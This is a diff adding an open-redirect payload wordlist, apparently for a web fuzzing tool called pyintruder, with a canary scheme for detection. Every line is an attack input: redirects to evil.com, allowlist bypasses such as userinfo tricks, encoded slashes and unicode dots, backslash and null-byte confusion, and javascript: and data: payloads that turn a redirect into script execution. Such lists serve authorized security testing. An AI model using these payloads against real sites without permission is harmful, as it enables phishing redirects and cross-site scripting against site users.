@@ -1,0 +1,53 @@
+# ==================================================================
+#  OPEN REDIRECT PAYLOADS (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Inject as a redirect param value: ?next= ?url= ?redirect= ?returnUrl= ?dest=
+#  Detection: watch the RESULTS "Redirect" column (or a 30x status + Location).
+#  Canary: point at YOUR domain carrying xq9z — if the Redirect/Location shows
+#  xq9z, the redirect is attacker-controlled. Replace evil.com with your domain;
+#  where a payload bypasses an allowlist, replace target.com with the real host.
+#  '&'/'#' are written %26/%23 so URLs transmit raw.
+# ==================================================================
+
+# ---- 0. CANARY / detection — redirect to your domain with the token ----
+https://xq9z.evil.com
+//xq9z.evil.com
+https://evil.com/xq9z
+https://evil.com?x=xq9z
+
+# ---- 1. Basic ----
+https://evil.com
+http://evil.com
+//evil.com
+//evil.com/
+/\evil.com
+/\/evil.com
+\/\/evil.com
+https:evil.com
+https:/evil.com
+https://evil.com/
+
+# ---- 2. Bypass an allowlist / target-in-url check (target.com = real host) ----
+https://target.com.evil.com
+https://evil.com/target.com
+https://target.com@evil.com
+https://evil.com%23@target.com
+https://evil.com%2f%2e%2e
+//evil.com%2f%2e%2e
+////evil.com
+https:////evil.com
+/%2f/evil.com
+/%09/evil.com
+
+# ---- 3. Backslash / control-char / unicode confusion ----
+https:/\evil.com
+https:\\evil.com
+/\/\evil.com
+https://evil%E3%80%82com
+https://evil.com%E2%80%8B
+http://evil.com%00.target.com
+
+# ---- 4. Scheme-based (redirect -> XSS / local scheme) ----
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+javascript://%0aalert(1)
